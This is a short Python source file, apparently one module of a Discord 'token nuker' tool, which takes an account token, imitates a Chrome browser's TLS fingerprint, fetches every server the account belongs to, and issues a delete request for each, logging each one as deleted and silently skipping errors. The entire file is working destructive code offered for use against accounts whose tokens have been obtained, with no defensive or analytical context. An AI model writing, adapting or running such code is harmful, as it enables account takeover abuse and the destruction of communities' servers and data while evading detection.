from Helper import *
from Helper.Common.utils import *
from Helper.Plugs.TokenNukerPlugs import *

def deleteServers(token):
    session = tls_client.Session(client_identifier="chrome_122", random_tls_extension_order=True)
    session.keep_alive = True
    new_title("Nexus Server Leaver")
    guildsIds = session.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
    for guild in guildsIds:
        try:
            session.delete(f'https://discord.com/api/v8/guilds/'+guild['id'], headers={'Authorization': token})
            print(f"{lc} {Fore.BLUE}Server={Fore.WHITE}{guild['name']}{Fore.RESET} {Fore.RESET}{Fore.LIGHTBLACK_EX}{Style.BRIGHT}[{Fore.GREEN}DELETED{Style.BRIGHT}{Fore.LIGHTBLACK_EX}]{Fore.RESET}")
        except Exception as e:
            print(f"{lc} The following error has been encountered and is being ignored: {e}")